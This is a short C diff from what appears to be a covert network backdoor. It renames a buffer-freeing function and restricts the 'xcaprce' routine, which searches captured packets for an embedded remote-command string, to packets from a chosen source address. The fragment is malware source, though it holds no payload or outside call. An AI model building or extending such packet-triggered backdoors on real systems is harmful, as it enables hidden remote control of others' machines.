@@ -82,7 +82,7 @@ void snapshot_dump(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
   }
 }
 
-void snapshot_free(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
+void xcap_ring_buffer_free(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
   boopprintf("  -> Free Snapshot\n");
   for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
     struct xcap_ip_packet *xpack;
@@ -247,6 +247,13 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
     if (!xpack->captured) {
       continue;  // Ignore non captured packets in the buffer
     }
+    char *xpack_saddr = inet_ntoa(xpack->iph->ip_src);
+
+    char *ret = strstr(search, xpack_saddr);
+    if (!ret) {
+      continue; // Ignore packets not from our search!
+    }
+
     unsigned char *packet = xpack->packet;
     // DPI for our RCE
     char *rce_sub;
@@ -258,19 +265,21 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
       found = rce_filter(rce_sub, rce);
       if (found) {
         // xpack_dump(xpack);
-        snapshot_free(snap);
+        xcap_ring_buffer_free(snap);
         return 0;  // Money, Success, Fame, Glamour
       } else {
         boopprintf("  -> [FILTER FAILURE] No RCE in xCap!\n");
         //snapshot_dump(snap);
-        snapshot_free(snap);
+        xcap_ring_buffer_free(snap);                   // Flush snapshot after RCE
+        //xcap_ring_buffer_free(xcap_ring_buffer); // Flush ring buffer after RCE
         return 1;
       }
     }
   }
   boopprintf("  -> No RCE in xCap!\n");
   //snapshot_dump(snap);
-  snapshot_free(snap);
+  xcap_ring_buffer_free(snap);                   // Flush snapshot after RCE
+  //xcap_ring_buffer_free(xcap_ring_buffer); // Flush ring buffer after RCE
   return 1;
   // return 0; // When we found our RCE!
 }
